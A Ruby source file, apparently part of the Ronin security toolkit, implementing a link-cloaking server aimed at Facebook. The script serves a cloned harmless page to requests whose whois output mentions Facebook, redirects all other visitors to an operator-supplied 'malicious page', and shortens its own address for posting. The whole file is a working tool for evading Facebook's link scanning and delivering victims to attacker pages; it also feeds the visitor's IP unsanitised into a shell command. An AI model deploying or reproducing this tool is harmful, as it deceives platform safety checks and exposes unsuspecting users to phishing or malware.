#!/usr/bin/env ruby

#
# Copyright (c) 2012 Bryan Bickford (bryan at unhwildhats dot com)
#
# Ronin is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ronin is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ronin.  If not, see <http://www.gnu.org/licenses/>.
#

require 'webrick'
require 'ronin/web'
require 'googl'
require 'socket'

$goodurl = "null"
$badurl = "null"

class Web < WEBrick::HTTPServlet::AbstractServlet
  def do_GET(request, response)
    ip = request.remote_ip
    puts "[+] New request from ", ip
    output = %x[whois #{ip}]
    if ( output =~ /Facebook/ )
      puts " ... IP belongs to Facebook."
      puts "  [-] Giving the cloned page."
      body = Ronin::Web.get_body($goodurl)
    else
      puts " ... IP does not belong to Facebook."
      puts "  [-] Giving a malicious page."
      body = "<html><head><meta HTTP-EQUIV=\"REFRESH\" content=\"0;url=" + $badurl + "\"></head></html>"
    end
    response.status = 200
    response['Content-Type'] = "text/html"
    response.body = body
  end
end

class Prompt
  def start
    puts "Enter URL of address to clone"
    STDOUT.flush
    $goodurl = gets.chomp
    puts "Enter URL to redirect to"
    STDOUT.flush
    $badurl = gets.chomp
    puts "[+] Finding our IP address"
    local_ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
    puts " ... our ip is: " + local_ip
    puts "[+] Shortening URL for Facebook"
    url = Googl.shorten(local_ip)
    puts ""
    puts "#############################################"
    puts " [-] Shortened URL is " + url.short_url
    puts "============================================="
    puts ""
    
  end
end

if $0 == __FILE__ then
  prompt = Prompt.new
  prompt.start
  server = WEBrick::HTTPServer.new(:Port => 80,:AccessLog => [] )
  server.mount "/", Web
  trap "INT" do server.shutdown end
  server.start
end
